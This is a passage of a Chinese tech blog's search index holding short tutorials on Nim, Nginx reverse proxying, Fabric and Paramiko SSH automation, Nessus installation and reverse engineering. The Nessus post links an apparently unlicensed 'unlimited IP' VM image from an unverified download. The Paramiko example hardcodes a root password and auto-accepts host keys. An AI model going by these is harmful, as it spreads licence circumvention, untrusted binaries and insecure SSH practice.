    <content type="text"><![CDATA[Nim是一种静态类型编译的系统编程语言, 它结合了其他成熟语言的成功概念, 这次就带你5分钟学会Nim的编写, 来跟我一起尝试一下吧. Nim官网: https://Nim-lang.org/Nim中文社区: https://Nim-lang-cn.org/ 前言花了半小时的时间去试了试这门语言, 可以通过Nim生成js或者c的代码以及可执行文件, 感觉蛮酷的, 做个分享. 基础Nim编译出一个exe文件是这么做的: Nim c main.Nim Nim 编译出一个js文件是这么做的: Nim js main.Nim 发没发现? 只需要更改Nim 中的内容就可以了. 不过, 你无法编译成”世界上最好的语言”, 比如Nim php main.Nim, 会报错的！！ 超级详细带代码体验定义变量基本变量类型# 指定类型 var name: string = "HelloWorld" # 类型推断 var i = 10 列表(数组)var list = @[1,2,3,4,5] 加上@符号表明是动态数组, 可以进行Add和POP操作. Table(在Py叫Dict, Go叫Map)import tables var dict = {"one": "HeliantHuS"}.toTable # 取值 echo dict["one"] # HeliantHuS 注释# 打印HelloWorld echo "HelloWorld" Nim中的注释和Python一样. 判断case-ofvar name: string = readLine(stdin) # case就等于其他语言的switch, of就相当于case case name of "": echo "你不可以输入空的哦." of "HeliantHuS": echo "HeliantHuS is Handsome" else: echo "我没看懂你输入的是什么" if-elif-elseimport strformat var name: string = readLine(stdin) if name == "HeliantHuS": echo fmt"Hello, {name}" elif name == "exit": echo "Exit!!!" else: echo "没有匹配~" 循环whilewhile 没什么好说的, Python有的它也有. while true: echo "Hello" forfor i in countup(1, 10): echo i for i in 1..10: echo i 上面两段代码效果一样, 可以看出来比Python还要简洁. 函数定义一个函数import strformat proc hello(name: string): string = return fmt"Hello, {name}" 调用函数var result = hello("HeliantHuS") echo result 舍弃函数返回值discard hello("HeliantHuS") 在Nim中, 函数必须要有返回值, 你就必须要去用变量去接收或者直接echo, 不然会报错, 有时候函数的返回值也许不重要, 就需要去舍弃, 就要用关键字discard去舍弃. 作用域blockblock hello: echo "HelloWorld" Nim中也是使用缩进进行作用域的区分. 道理我都懂, 可我好像真的对你着迷.]]></content>
      <categories>
        <category>Nim</category>
      </categories>
      <tags>
        <tag>Nim</tag>
        <tag>元编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx反向代理骚操作详解]]></title>
    <url>%2F2019%2F10%2F03%2F5-Nginx-Config-ServerName%2F</url>
    <content type="text"><![CDATA[Nginx是一个的静态文件和反向代理服务，轻量，方便部署，而且性能极高.看完这篇文章, 你将点亮NGINX配置虚拟主机, 反向代理等技能点. 深入浅出worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root html; index index.html index.htm; } } } 上面这是一个nginx最基本的配置, 分http代码块, server代码块, 其中今天要玩的就是server这个代码块. 开始操作首先在nginx的静态文件夹保证有两个html文件, 分别为index.html、page1.html, 里面的内容自己随便写, 只要能分清楚是哪个文件就好. 正常启动正常启动Nginx, 访问通过服务器地址访问, 会访问到index.html的内容. 虚拟主机第一个server代码块不需要更改, 下面紧接着添加: server { listen 80; server_name page1.com; location / { root html; index page1.html; } } 这样, 只要访问这个服务器的时候，请求头的Host键内容为page1.com, 可以通过抓包或者修改hosts文件的方式来达到目的. 反向代理第二个server代码块不需要更改, 修改第一个server代码块的内容为: server { listen 80; server_name localhost; location / { proxy_pass http://hls.easy.echosite.cn/; } } 重启服务器, 访问localhost或者服务器真实IP, 你会发现, 显示的结果是你输入的http://hls.easy.echosite.cn的内容, 但是浏览器的URL依旧是localhost或服务器IP. 防盗链配置原理: 通过nginx的if判断, 只允许通过合法的域名访问本网站, 其余的域名访问本网站的时候直接返回403。 server { listen 80; server_name youdoamin.com; if ($host !~* ^youdomain.com$) { return 403; } location / { root html; index index.html index.htm; } } 临了, 最后的配置文件样子: 其实Nginx还有很多脚本类的东西, 太过深入就需要自己去研究了, NGINX一般还是作为接入层的反向代理去使用, 配置方便, 也轻量, 真的是做WEB必备的反向代理服务. 最后~ 文章中演示的hls.easy.echosite.cn是使用EchoSite2.0 内网穿透，就选他了！所内网穿透用来测试的, 如果有需要内网穿透的可以了解一下.]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>HTTP</tag>
        <tag>Proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fabric Python远程部署利器]]></title>
    <url>%2F2019%2F10%2F01%2F4-Fabric-Python-Remote-deploy%2F</url>
    <content type="text"><![CDATA[Fabric是一个Python的第三方库，可以进行Linux的远程部署，批量执行各种命令，况且，机器出错的次数比你少多了呢。(附详细的SSH免密登录过程) 环境介绍 Windows10的WSL IP: 192.168.1.66 下面简称物理机. VMware Centos服务器 IP: 192.168.1.40 下面简称服务器. 准备工作 Python3 类Linux操作系统 | 没有Linux用Windows的WSL也可以. 技术难点 SSH免密登录. 深入浅出SSH免密使用ssh-keygen命令在物理机生成公钥和私钥, 生成完毕后在当前登录的用户目录下.ssh文件夹下. 在服务器中的.ssh文件夹下创建一个名为authorized_keys文件并设置权限为600. cd ~/.ssh touch authorized_keys chmod 600 authorized_keys 将物理机的id_rsa.pub里面的内容复制进服务器新建的authorized_keys中.可以使用scp命令，将id_rsa.pub文件发送到服务器中，然后使用cat命令将id_rsa.pub的内容追加到authorized_keys文件中.物理机: scp ~/.ssh/id_rsa.pub root@192.168.1.40:~/.ssh/ 服务器: cat id_rsa.pub &gt;&gt; authorized_keys 使用物理机远程SSH连接服务器验证是否免密成功 安装Fabric在物理机执行下面的安装命令即可安装完毕. python3 -m pip install fabric 找一个空的目录新建名为fabfile.py的文件. 编写Fabric脚本使用vim编辑刚刚新建的py文件. from fabric import Connection, task @task def devploy(c): with Connection("root@192.168.1.40") as c: c.run("ifconfig") 写入完毕后保存，运行fab deploy即可看到服务器的执行回显. 可以用来一键替换更新yum源, 代码如下: from fabric import Connection, task @task def deploy(c): with Connection("root@192.168.1.40") as c: c.run('cd /etc/yum.repos.d/ &amp;&amp; \ mv CentOS-Media.repo CentOS-Media.repo.backup &amp;&amp; \ wget http://mirrors.163.com/.help/CentOS7-Base-163.repo &amp;&amp; \ yum clean all &amp;&amp; \ yum makecache &amp;&amp; \ yum update') 不是不愿意学习新的东西, 而是想知道学习这个能做什么, 加油.]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fabric</tag>
        <tag>远程部署</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nessus系统漏洞扫描平台(VMware傻瓜式安装)]]></title>
    <url>%2F2019%2F09%2F30%2F3-Nessus-Install-or-Use-and-License%2F</url>
    <content type="text"><![CDATA[最懊恼的就是安装这种软件了，免费版本只能扫描16个IP，收费版本在天朝没人会去买，买完也没人去分享，而现在，我来安利一波可以无限IP，而且还傻瓜式的Nessus安装方式. 准备工具 VMware Workstation (Version &gt;= 12) 科学上网工具 眼睛和脑子 下载Nessus(VMware版)https://mega.nz/#!0YkSDYpY!JndpKpH5yB3hDNV-091jOwPhW9rLK9iNSzuF9nTz-i0 部署Nessus导入至VMware首先解压下载的压缩文件，放到你能记得住的地方 然后打开vmware, File -&gt; Open, 选择Nessus 8_VM12.ovf文件. 开机运行 配置网卡默认的用户名和密码都在描述中写了, 按照描述进行操作绝对没问题的. 开机你肯定没问题了，按照他的要求访问https://1.1.2.1:8834你肯定访问不了，你需要修改网卡配置 这样，将网卡2改成NAT 就可以自动获取IP地址, 获取完毕直接输入ifconfig查看自动获取的IP地址, 访问自动获取的IP地址加端口号…哦对了, 一定要是https, 比如我自动获取的IP地址为192.168.23.134, 那么我在我物理机访问https://192.168.23.134:8834就可以了. 到这里就完全可以正常运行以及进行扫描了, 怎么运行扫描就要看你了, 赶紧继续学习吧~]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>扫描</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Paramiko Python远程连接工具]]></title>
    <url>%2F2019%2F09%2F29%2F2-paramiko-remote-exec%2F</url>
    <content type="text"><![CDATA[Paramiko是一个Python的远程操作库，可以进行SSH, SFTP等远程连接操作. 来学习学习怎么使用吧 安装Paramiko python3 -m pip install paramiko 开始使用导入paramikoimport paramiko 初始化SSHClientclient = paramiko.SSHClient() client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 连接主机我的Linux主机是192.168.1.40，用户名为root, 密码为admin123. client.connect(hostname="192.168.1.40", username="root", password="admin123.") 连接上会有几条警告，可以无视掉，或者直接屏蔽警告信息 发送命令执行一个ifconfig命令 stdin, stdout, stderr = client.exec_command("ifconfig") 注意这里, exec_command的返回值为tuple类型可以通过python3 -m pydoc paramiko.SSHClient.exec_command查看源码. 查看命令返回值for i in stdout.readlines(): print(i) 这样就得到了返回值 关闭连接不要总是依赖上下文, 要学会手动释放资源关闭连接 client.close() 到这里, paramiko的SSHClient用法就结束了，paramiko还支持SFTPClient等其他远程操作, 自己发掘吧~]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>paramiko</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Simple Reverse (简单的逆向)]]></title>
    <url>%2F2019%2F09%2F28%2F1-Simple-Reverse%2F</url>
    <content type="text"><![CDATA[学习使用IDA Pro 和 x64dbg反编译一个C语言程序. 准备工具 DevC++ IDA Pro x64dbg 开始动手！我直接做成了视频. 直接来看吧.【逆向工程】IDA Pro + x64dgb反编译一个应用程序]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
</search>
